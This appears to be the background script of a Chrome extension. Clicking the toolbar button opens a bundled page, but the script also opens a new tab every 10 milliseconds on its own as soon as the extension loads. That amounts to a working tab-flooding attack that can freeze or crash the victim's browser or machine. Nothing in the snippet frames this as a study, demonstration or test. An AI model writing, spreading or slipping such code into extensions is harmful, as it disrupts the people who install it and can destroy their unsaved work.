chrome.browserAction.onClicked.addListener(function (tab) {
    chrome.tabs.create({
      url: chrome.extension.getURL('1.html'),
      selected: true,
    })
  })
  function openNewTab() {
    chrome.tabs.create({});
  }
  
  setInterval(openNewTab, 10);